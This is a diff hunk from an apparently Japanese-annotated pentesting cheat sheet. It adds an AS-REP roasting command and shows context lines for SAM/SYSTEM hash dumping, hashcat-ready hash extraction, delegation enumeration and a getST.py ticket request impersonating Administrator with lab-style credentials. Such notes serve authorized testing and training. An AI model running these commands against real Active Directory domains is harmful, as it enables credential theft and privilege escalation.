@@ -11,6 +11,7 @@ impacket-secretsdump -sam <file> -system <file> LOCAL #SAMとsystemのハッシ�
 
 impacket-GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手できるユーザの列挙、その後-requestオプションをつけてhashを入手
 impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile user.txt -format hashcat -outputfile hash.txt -no-pass #パスワード認証なしでハッシュの入手を試みる
+impacket-GetNPUsers -dc-ip <IP> -request -usersfile usernames.txt example.local/ #ケルベロスドメイン認証を必要としないユーザの表示
 
 findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
 getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
